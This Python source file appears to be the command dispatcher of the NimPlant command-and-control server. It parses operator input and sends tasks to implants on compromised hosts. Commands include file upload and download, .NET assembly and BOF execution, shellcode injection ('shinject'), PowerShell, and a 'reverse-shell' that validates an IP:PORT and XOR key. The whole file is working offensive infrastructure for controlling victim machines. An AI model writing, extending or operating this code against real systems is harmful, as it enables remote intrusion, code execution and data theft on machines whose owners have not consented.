import shlex
import yaml
import json
from yaml.loader import FullLoader
import src.util.time as time
import src.servers.admin_api.commands.commands as commands
import src.servers.admin_api.models.nimplant_listener_model as listener
from src.servers.admin_api.models.nimplant_client_model import NimPlant
import src.config.db as db
import src.util.utils as utils
import src.util.time as utils_time

def get_commands():
    with open("src/servers/admin_api/commands/commands.yaml", "r", encoding="UTF-8") as f:
        return sorted(yaml.load(f, Loader=FullLoader), key=lambda c: c["command"])


def get_command_list():
    return [c["command"] for c in get_commands()]


def get_risky_command_list():
    return [c["command"] for c in get_commands() if c["risky_command"]]


def handle_command(raw_command, np: NimPlant = None):
    from src.servers.admin_api.admin_server_init import np_server
    if np is None:
        np = listener.np_server.get_active_nimplant()
    
    # If np is still None, it means that no active implant is selected
    if np is None:
        # Handle commands that don't require an active implant
        cmd = raw_command.lower().split(" ")[0]
        args = shlex.split(raw_command.replace("\\", "\\\\"))[1:]
        
        # Global commands that work without an active implant
        if cmd == "":
            return
        elif cmd == "clear":
            commands.cls()
            return
        elif cmd == "help":
            msg = commands.get_help_menu()
            utils.nimplant_print(msg)
            return
        elif cmd == "list":
            msg = np_server.get_nimplant_info()
            utils.nimplant_print(msg)
            return
        elif cmd == "listall":
            msg = np_server.get_nimplant_info(include_all=True)
            utils.nimplant_print(msg)
            return
        elif cmd == "exit":
            commands.exit_server_console()
            return
        else:
            utils.nimplant_print("No active implant selected. Use 'select [ID]' to select an implant, or 'list' to see all implants.")
            return

    # If we get here, there is an active implant selected
    utils.log(f"Implant {np.id} $ > {raw_command}", np.guid)

    try:
        cmd = raw_command.lower().split(" ")[0]
        args = shlex.split(raw_command.replace("\\", "\\\\"))[1:]
        nimplant_cmds = [cmd.lower() for cmd in get_command_list()]

        # Handle commands
        if cmd == "":
            pass

        elif cmd in get_risky_command_list() and not np.risky_mode:
            msg = (
                f"Uh oh, you compiled this Implant in safe mode and '{cmd}' is considered to be a risky command.\n"
                "Please enable 'riskyMode' in 'config.toml' and re-compile Implant!"
            )
            utils.nimplant_print(msg, np.guid, raw_command)

        elif cmd == "cancel":
            np.cancel_all_tasks()
            utils.nimplant_print(
                f"All tasks cancelled for implant {np.id}.", np.guid, raw_command
            )

        elif cmd == "clear":
            commands.cls()

        elif cmd == "getpid":
            msg = f"Implant PID is {np.pid}"
            handle_local_command(np, raw_command, msg)

        elif cmd == "getprocname":
            msg = f"Implant is running inside of {np.pname}"
            handle_local_command(np, raw_command, msg)

        elif cmd == "help":
            try:
                if len(args) >= 1:
                    msg = commands.get_command_help(args[0])
                else:
                    msg = commands.get_help_menu()
                
                # Ensure the message is a string
                if msg is None:
                    msg = "No help content available."
                
                handle_local_command(np, raw_command, msg)
            except Exception as e:
                utils.nimplant_print(f"ERROR in help command: {str(e)}", np.guid, raw_command)
                import traceback
                utils.nimplant_print(traceback.format_exc(), np.guid)
                
        elif cmd == "hostname":
            msg = f"Implant hostname is: {np.hostname}"
            handle_local_command(np, raw_command, msg)

        elif cmd == "ipconfig":
            msg = f"Implant external IP address is: {np.ip_external}\n"
            msg += f"Implant internal IP address is: {np.ip_internal}"
            handle_local_command(np, raw_command, msg)

        elif cmd == "list":
            msg = np_server.get_nimplant_info()
            handle_local_command(np, raw_command, msg)

        elif cmd == "listall":
            msg = np_server.get_nimplant_info(include_all=True)
            handle_local_command(np, raw_command, msg)

        elif cmd == "nimplant":
            msg = np.get_info_pretty()
            handle_local_command(np, raw_command, msg)

        elif cmd == "osbuild":
            msg = f"Implant OS build is: {np.os_build}"
            handle_local_command(np, raw_command, msg)

        elif cmd == "exit":
            commands.exit_server_console()

        elif cmd == "upload":
            commands.upload_file(np, args, raw_command)

        elif cmd == "download":
            commands.download_file(np, args, raw_command)

        elif cmd == "execute-assembly":
            commands.execute_assembly(np, args, raw_command)

        elif cmd == "inline-execute":
            commands.inline_execute(np, args, raw_command)

        elif cmd == "shinject":
            commands.shinject(np, args, raw_command)

        elif cmd == "powershell":
            commands.powershell(np, args, raw_command)

        elif cmd == "reverse-shell":
            # Pre-validation before calling the main function
            if len(args) < 2:
                handle_local_command(np, raw_command, 
                    "Invalid number of arguments received. Usage: 'reverse-shell <IP:PORT> <XOR_KEY>'."
                )
                return
            
            # Validate IP:PORT format
            ip_port = args[0]
            if ":" not in ip_port:
                handle_local_command(np, raw_command,
                    "Invalid IP:PORT format. Usage: 'reverse-shell <IP:PORT> <XOR_KEY>'."
                )
                return
                
            # Validate XOR_KEY format
            xor_key = args[1]
            try:
                if xor_key.startswith("0x"):
                    # Hex format
                    int(xor_key[2:], 16)
                else:
                    # Decimal format
                    int(xor_key)
            except ValueError:
                handle_local_command(np, raw_command,
                    "Invalid XOR key. Must be a number (decimal or hex with 0x prefix)."
                )
                return
                
            # If all validations pass, call the function
            commands.reverse_shell(np, args, raw_command)

        # Handle commands that do not need any server-side handling
        elif cmd in nimplant_cmds:
            guid = np.add_task(list([cmd, *args]), task_friendly=raw_command)
            utils.nimplant_print(
                f"Staged command '{raw_command}'.", np.guid, task_guid=guid
            )
        else:
            utils.nimplant_print(
                "Unknown command. Enter 'help' to get a list of commands.",
                np.guid,
                raw_command,
            )

    except Exception as e:
        utils.nimplant_print(
            f"An unexpected exception occurred when handling command: {repr(e)}",
            np.guid,
            raw_command,
        )

def handle_local_command(np: NimPlant, raw_command: str, result: str):
    """
    Helper function to handle local commands that don't require communication with the implant.
    
    Args:
        np: NimPlant object associated with the command
        raw_command: The complete command as entered
        result: The command result to display and log
        
    Returns:
        None
    """
    # Generate a unique GUID for this local command
    task_guid = f"local-{np.guid}-{utils_time.timestamp().replace(' ','-').replace('/','')}"
    
    # Log the command as a task in the database
    db.db_nimplant_log(np, task_guid=task_guid, task=raw_command, task_friendly=raw_command)
    
    # Log the result in the database
    db.db_nimplant_log(np, task_guid=task_guid, result=result)
    
    # Display the result in the console
    utils.nimplant_print(result, np.guid, task_guid=task_guid)
